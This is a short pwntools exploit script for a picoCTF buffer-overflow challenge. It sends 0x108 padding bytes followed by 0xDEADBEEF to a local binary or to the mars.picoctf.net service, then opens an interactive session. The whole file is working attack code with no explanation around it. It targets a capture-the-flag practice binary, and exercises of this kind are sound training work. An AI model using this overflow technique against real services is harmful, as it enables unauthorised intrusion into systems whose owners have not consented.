#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 31890
HOST = "mars.picoctf.net"
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x400751
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = flat(
	b'A'*0x108,
	0xDEADBEEF
	)
# GDB()
p.sendlineafter(b"see?", pl)
p.interactive()
